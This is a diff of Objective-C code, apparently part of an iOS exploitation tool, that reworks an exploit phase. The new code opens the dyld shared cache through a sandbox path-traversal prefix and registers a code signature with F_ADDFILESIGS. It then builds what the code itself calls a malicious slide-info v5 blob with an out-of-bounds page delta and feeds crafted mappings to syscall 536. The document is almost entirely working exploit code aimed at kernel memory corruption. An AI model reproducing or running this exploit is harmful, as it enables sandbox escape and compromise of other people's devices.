@@ -9444,35 +9444,56 @@ static uint64_t rie_find_exec_base(task_t task,
             [self appendLog:[NSString stringWithFormat:@"syscall(536, NULL,NULL,NULL,NULL): ret=%ld errno=%d", rNull, errno]];
         }
 
-        // ── Phase E: Direct syscall 536 — parse cache from SR memory, build blob ──
-        [self appendLog:@"\n── Phase E: direct syscall 536 (no child, fd=-1 inject) ──"];
+        // ── Phase E: Direct syscall 536 — open cache file, parse header, build blob ──
+        // Reference exploit (rie.c) opens the dyld cache FILE from disk — does NOT
+        // read from 0x180000000 (which is a VM submap inaccessible from userspace).
+        [self appendLog:@"\n── Phase E: direct syscall 536 (open cache + fd=-1 inject) ──"];
 
-        // On iOS, 0x180000000 is a VM submap — direct deref causes SIGSEGV/SIGBUS.
-        // Use mach_vm_read_overwrite to read through the submap via kernel VM.
-        Rie_VMReadOverwriteFn rie_vmRead = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
-        if (!rie_vmRead) {
-            [self appendLog:@"!! mach_vm_read_overwrite not available — skipping Phase E"];
+        // Step 1: Open dyld cache file via sandbox traversal
+        [self appendLog:@"-- cache file probe --"];
+        const char *cachePaths[] = {
+            "/System/Library/dyld/dyld_shared_cache_arm64e",
+            "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
+            "/System/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
+            "/private/preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
+            "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
+            NULL,
+        };
+        int cacheFD = -1;
+        NSString *cacheResolved = nil;
+        for (int pi = 0; cachePaths[pi]; pi++) {
+            NSString *raw = [traversalPrefix stringByAppendingString:
+                [NSString stringWithUTF8String:cachePaths[pi]]];
+            NSString *resolved = [raw stringByExpandingTildeInPath];
+            cacheFD = open([resolved UTF8String], O_RDONLY);
+            if (cacheFD >= 0) {
+                cacheResolved = resolved;
+                [self appendLog:[NSString stringWithFormat:@"  FOUND: %@ (fd=%d)", resolved, cacheFD]];
+                break;
+            }
+            [self appendLog:[NSString stringWithFormat:@"  miss: %@ (errno=%d)", resolved, errno]];
+        }
+
+        if (cacheFD < 0) {
+            [self appendLog:@"!! no cache file accessible — cannot proceed with Phase E"];
         } else {
-            #define RIE_SR_BUF_SIZE 0x4000
-            uint8_t *sr_heap = (uint8_t *)malloc(RIE_SR_BUF_SIZE);
-            if (!sr_heap) {
-                [self appendLog:@"!! sr_heap alloc failed"];
+            // Step 2: Read cache header via mmap (like rie.c fmp_map_header)
+            struct stat cacheSt;
+            if (fstat(cacheFD, &cacheSt) != 0) {
+                [self appendLog:@"!! fstat cache failed"];
             } else {
-                memset(sr_heap, 0, RIE_SR_BUF_SIZE);
-                rie_mach_vm_size_t rie_outSize = 0;
-                kern_return_t rie_kr = rie_vmRead(mach_task_self(), 0x180000000ULL,
-                    RIE_SR_BUF_SIZE, (rie_mach_vm_address_t)(uintptr_t)sr_heap, &rie_outSize);
-                if (rie_kr != KERN_SUCCESS) {
-                    [self appendLog:[NSString stringWithFormat:@"!! vm_read SR failed: kr=%d", rie_kr]];
+                size_t mapLen = (size_t)cacheSt.st_size;
+                if (mapLen > 0x100000) mapLen = 0x100000;
+                const uint8_t *sr_base = (const uint8_t *)mmap(NULL, mapLen, PROT_READ,
+                    MAP_PRIVATE, cacheFD, 0);
+                if (sr_base == MAP_FAILED) {
+                    [self appendLog:[NSString stringWithFormat:@"!! mmap cache failed: errno=%d", errno]];
                 } else {
-                    [self appendLog:[NSString stringWithFormat:@"vm_read SR: got %llu bytes",
-                        (unsigned long long)rie_outSize]];
-                    const uint8_t *sr_base = sr_heap;
                     uint32_t hdrMagic; memcpy(&hdrMagic, sr_base, 4);
-                    [self appendLog:[NSString stringWithFormat:@"SR[0x180000000] magic=0x%08x '%.4s'",
+                    [self appendLog:[NSString stringWithFormat:@"cache[0] magic=0x%08x '%.4s'",
                         hdrMagic, (char*)&hdrMagic]];
                     if (hdrMagic != 0x64796c64) {
-                        [self appendLog:@"!! not a dyld_v1 header at 0x180000000"];
+                        [self appendLog:@"!! not a dyld_v1 cache header"];
                     } else {
             #define RIE_RD32(off) (*(uint32_t*)(sr_base + (off)))
             #define RIE_RD64(off) (*(uint64_t*)(sr_base + (off)))
@@ -9517,139 +9538,101 @@ static uint64_t rie_find_exec_base(task_t task,
                 [self appendLog:[NSString stringWithFormat:@"target non-auth carrier: MWS[%d] addr=0x%llx sz=0x%llx foff=0x%llx slide=0x%llx flags=0x%llx max=%x init=%x",
                     foundNonAuth, naAddr, naSize, naFoff, naSlide, naFlags, naMax, naInit]];
 
-                [self appendLog:@"\n-- cache file probe --"];
-                const char *cachePaths[] = {
-                    "/System/Library/dyld/dyld_shared_cache_arm64e",
-                    "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
-                    "/System/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
-                    "/private/preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
-                    "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
-                    NULL,
-                };
-                int cacheFD = -1;
-                NSString *cacheResolved = nil;
-                for (int pi = 0; cachePaths[pi]; pi++) {
-                    NSString *raw = [traversalPrefix stringByAppendingString:
-                        [NSString stringWithUTF8String:cachePaths[pi]]];
-                    NSString *resolved = [raw stringByExpandingTildeInPath];
-                    cacheFD = open([resolved UTF8String], O_RDONLY);
-                    if (cacheFD >= 0) {
-                        cacheResolved = resolved;
-                        [self appendLog:[NSString stringWithFormat:@"  FOUND: %@ (fd=%d)", resolved, cacheFD]];
-                        break;
-                    }
-                    [self appendLog:[NSString stringWithFormat:@"  miss: %@ (errno=%d)", resolved, errno]];
-                }
+                // Step 3: Register code signature via F_ADDFILESIGS
+                [self appendLog:@"\n-- register code sig + build blob --"];
+                rie_fsignatures_t fs;
+                memset(&fs, 0, sizeof(fs));
+                fs.fs_file_start = 0;
+                fs.fs_blob_start = (void *)(uintptr_t)cs_off;
+                fs.fs_blob_size = (size_t)cs_sz;
+                int fsigRC = fcntl(cacheFD, F_ADDFILESIGS_RETURN, &fs);
+                [self appendLog:[NSString stringWithFormat:@"F_ADDFILESIGS(fd=%d): rc=%d errno=%d",
+                    cacheFD, fsigRC, errno]];
 
-                uint32_t subOff = *(uint32_t*)(sr_base + 0x188);
-                uint32_t subCnt = *(uint32_t*)(sr_base + 0x18c);
-                [self appendLog:[NSString stringWithFormat:@"subCacheArray: off=0x%x cnt=%u", subOff, subCnt]];
-                if (subCnt > 0 && subCnt < 10) {
-                    for (uint32_t si = 0; si < subCnt; si++) {
-                        const uint8_t *se = sr_base + subOff + si * 56;
-                        char suffix[33] = {0};
-                        memcpy(suffix, se + 24, 32);
-                        [self appendLog:[NSString stringWithFormat:@"  sub[%u] suffix='%s'", si, suffix]];
-                    }
-                }
-
-                [self appendLog:@"\n-- slide blob + syscall 536 test --"];
-                if (cacheFD < 0) {
-                    [self appendLog:@"!! no cache file open — cannot register code sig"];
+                // Step 4: Build malicious slide-info v5 blob
+                #define BLOB_PAGE_SIZE 0x4000
+                #define BLOB_PAGE_COUNT 64
+                #define BLOB_TARGET_PAGE 2
+                #define BLOB_OOB_DELTA 0xFFFE
+                size_t blob_hdr_size = 24;
+                size_t blob_ps_size  = BLOB_PAGE_COUNT * 2;
+                size_t blob_total = blob_hdr_size + blob_ps_size;
+                uint8_t *blob = (uint8_t *)calloc(1, blob_total);
+                if (!blob) {
+                    [self appendLog:@"!! blob alloc failed"];
                 } else {
-                    rie_fsignatures_t fs;
-                    memset(&fs, 0, sizeof(fs));
-                    fs.fs_file_start = 0;
-                    fs.fs_blob_start = (void *)(uintptr_t)cs_off;
-                    fs.fs_blob_size = (size_t)cs_sz;
-                    int fsigRC = fcntl(cacheFD, F_ADDFILESIGS_RETURN, &fs);
-                    [self appendLog:[NSString stringWithFormat:@"F_ADDFILESIGS(fd=%d): rc=%d errno=%d",
-                        cacheFD, fsigRC, errno]];
+                    uint32_t ver = 5, ps = BLOB_PAGE_SIZE, psc = BLOB_PAGE_COUNT;
+                    uint64_t va = 0;
+                    memcpy(blob + 0,  &ver, 4);
+                    memcpy(blob + 4,  &ps,  4);
+                    memcpy(blob + 8,  &psc, 4);
+                    memcpy(blob + 16, &va,  8);
+                    uint16_t *pstarts = (uint16_t *)(blob + 24);
+                    for (uint32_t j = 0; j < BLOB_PAGE_COUNT; j++)
+                        pstarts[j] = 0xFFFF;
+                    pstarts[BLOB_TARGET_PAGE] = BLOB_OOB_DELTA;
+                    [self appendLog:[NSString stringWithFormat:@"blob: ver=%u ps=0x%x cnt=%u target[%u]=0x%x total=%zu",
+                        ver, ps, psc, BLOB_TARGET_PAGE, BLOB_OOB_DELTA, blob_total]];
 
-                    #define BLOB_PAGE_SIZE 0x4000
-                    #define BLOB_PAGE_COUNT 64
-                    #define BLOB_TARGET_PAGE 2
-                    #define BLOB_OOB_DELTA 0xFFFE
-                    size_t blob_hdr_size = 24;
-                    size_t blob_ps_size  = BLOB_PAGE_COUNT * 2;
-                    size_t blob_total = blob_hdr_size + blob_ps_size;
-                    uint8_t *blob = (uint8_t *)calloc(1, blob_total);
-                    if (!blob) {
-                        [self appendLog:@"!! blob alloc failed"];
+                    // Step 5: Build sr_cfg and call syscall 536
+                    #define CFG_SIZE (sizeof(struct rie_sr_cfg) + 0x4000)
+                    void *cfg_buf = mmap(NULL, CFG_SIZE, PROT_READ|PROT_WRITE,
+                        MAP_PRIVATE|MAP_ANON, -1, 0);
+                    if (cfg_buf == MAP_FAILED) {
+                        [self appendLog:@"!! cfg mmap failed"];
                     } else {
-                        uint32_t ver = 5, ps = BLOB_PAGE_SIZE, psc = BLOB_PAGE_COUNT;
-                        uint64_t va = 0;
-                        memcpy(blob + 0,  &ver, 4);
-                        memcpy(blob + 4,  &ps,  4);
-                        memcpy(blob + 8,  &psc, 4);
-                        memcpy(blob + 16, &va,  8);
-                        uint16_t *pstarts = (uint16_t *)(blob + 24);
-                        for (uint32_t j = 0; j < BLOB_PAGE_COUNT; j++)
-                            pstarts[j] = 0xFFFF;
-                        pstarts[BLOB_TARGET_PAGE] = BLOB_OOB_DELTA;
-                        [self appendLog:[NSString stringWithFormat:@"blob: ver=%u ps=0x%x cnt=%u target[%u]=0x%x total=%zu",
-                            ver, ps, psc, BLOB_TARGET_PAGE, BLOB_OOB_DELTA, blob_total]];
+                        memset(cfg_buf, 0, CFG_SIZE);
+                        struct rie_sr_cfg *cfg = (struct rie_sr_cfg *)cfg_buf;
+                        cfg->magic = RIE_SR_CFG_MAGIC;
+                        cfg->blob_off = 0x4000;
+                        snprintf(cfg->main_path, sizeof(cfg->main_path), "%s",
+                            cacheResolved ? [cacheResolved UTF8String] : "");
+                        cfg->files[0].sf_fd = -1;
+                        cfg->files[0].sf_mappings_count = 1;
+                        cfg->files[0].sf_slide = 0;
+                        cfg->files[1].sf_fd = -1;
+                        cfg->files[1].sf_mappings_count = 1;
+                        cfg->files[1].sf_slide = 0;
+                        cfg->mappings[0].sms_address = 0x180000000ULL;
+                        cfg->mappings[0].sms_size = naSize;
+                        cfg->mappings[0].sms_file_offset = 0;
+                        cfg->mappings[0].sms_slide_size = 0;
+                        cfg->mappings[0].sms_max_prot = 1;
+                        cfg->mappings[0].sms_init_prot = 1;
+                        uint64_t blob_sr = 0x180000000ULL + naSize;
+                        cfg->mappings[1].sms_address = blob_sr;
+                        cfg->mappings[1].sms_size = 0x4000;
+                        cfg->mappings[1].sms_file_offset = (uint64_t)(uintptr_t)((uint8_t*)cfg_buf + 0x4000);
+                        cfg->mappings[1].sms_slide_size = 0;
+                        cfg->mappings[1].sms_max_prot = 1;
+                        cfg->mappings[1].sms_init_prot = 1;
+                        cfg->fault_addr = naAddr;
+                        cfg->blob_size = blob_total;
+                        memcpy((uint8_t*)cfg_buf + 0x4000, blob, blob_total);
 
-                        #define CFG_SIZE (sizeof(struct rie_sr_cfg) + 0x4000)
-                        void *cfg_buf = mmap(NULL, CFG_SIZE, PROT_READ|PROT_WRITE,
-                            MAP_PRIVATE|MAP_ANON, -1, 0);
-                        if (cfg_buf == MAP_FAILED) {
-                            [self appendLog:@"!! cfg mmap failed"];
-                        } else {
-                            memset(cfg_buf, 0, CFG_SIZE);
-                            struct rie_sr_cfg *cfg = (struct rie_sr_cfg *)cfg_buf;
-                            cfg->magic = RIE_SR_CFG_MAGIC;
-                            cfg->blob_off = 0x4000;
-                            snprintf(cfg->main_path, sizeof(cfg->main_path), "%s",
-                                cacheResolved ? [cacheResolved UTF8String] : "");
-                            cfg->files[0].sf_fd = -1;
-                            cfg->files[0].sf_mappings_count = 1;
-                            cfg->files[0].sf_slide = 0;
-                            cfg->files[1].sf_fd = -1;
-                            cfg->files[1].sf_mappings_count = 1;
-                            cfg->files[1].sf_slide = 0;
-                            cfg->mappings[0].sms_address = 0x180000000ULL;
-                            cfg->mappings[0].sms_size = naSize;
-                            cfg->mappings[0].sms_file_offset = 0;
-                            cfg->mappings[0].sms_slide_size = 0;
-                            cfg->mappings[0].sms_max_prot = 1;
-                            cfg->mappings[0].sms_init_prot = 1;
-                            uint64_t blob_sr = 0x180000000ULL + naSize;
-                            cfg->mappings[1].sms_address = blob_sr;
-                            cfg->mappings[1].sms_size = 0x4000;
-                            cfg->mappings[1].sms_file_offset = (uint64_t)(uintptr_t)((uint8_t*)cfg_buf + 0x4000);
-                            cfg->mappings[1].sms_slide_size = 0;
-                            cfg->mappings[1].sms_max_prot = 1;
-                            cfg->mappings[1].sms_init_prot = 1;
-                            cfg->fault_addr = naAddr;
-                            cfg->blob_size = blob_total;
-                            memcpy((uint8_t*)cfg_buf + 0x4000, blob, blob_total);
+                        [self appendLog:[NSString stringWithFormat:@"cfg@%p blob_sr=0x%llx fault=0x%llx blobSz=%zu",
+                            cfg_buf, blob_sr, cfg->fault_addr, blob_total]];
 
-                            [self appendLog:[NSString stringWithFormat:@"cfg@%p blob_sr=0x%llx fault=0x%llx blobSz=%zu",
-                                cfg_buf, blob_sr, cfg->fault_addr, blob_total]];
+                        long r536_1 = sc(536, 1, cfg->files, 1, cfg->mappings);
+                        [self appendLog:[NSString stringWithFormat:@"syscall(536, 1file, 1map): ret=%ld errno=%d",
+                            r536_1, errno]];
+                        long r536_2 = sc(536, 2, cfg->files, 2, cfg->mappings);
+                        [self appendLog:[NSString stringWithFormat:@"syscall(536, 2file, 2map): ret=%ld errno=%d",
+                            r536_2, errno]];
 
-                            long r536_1 = sc(536, 1, cfg->files, 1, cfg->mappings);
-                            [self appendLog:[NSString stringWithFormat:@"syscall(536, 1file, 1map): ret=%ld errno=%d",
-                                r536_1, errno]];
-                            long r536_2 = sc(536, 2, cfg->files, 2, cfg->mappings);
-                            [self appendLog:[NSString stringWithFormat:@"syscall(536, 2file, 2map): ret=%ld errno=%d",
-                                r536_2, errno]];
-
-                            munmap(cfg_buf, CFG_SIZE);
-                            #undef CFG_SIZE
-                        }
-                        free(blob);
+                        munmap(cfg_buf, CFG_SIZE);
+                        #undef CFG_SIZE
                     }
-                    close(cacheFD);
+                    free(blob);
                 }
                         #undef MWS_SIZE
                     }
                 }
-                }  // close vm_read success else
-                free(sr_heap);
-            }  // close sr_heap else
-            #undef RIE_SR_BUF_SIZE
-        }  // close rie_vmRead else
+                    munmap((void *)sr_base, mapLen);
+                }  // close mmap success else
+            }  // close fstat success else
+            close(cacheFD);
+        }  // close cacheFD else
 
         // ── Phase B: API availability scan ──
         [self appendLog:@"\n── Phase B: API availability scan ──"];
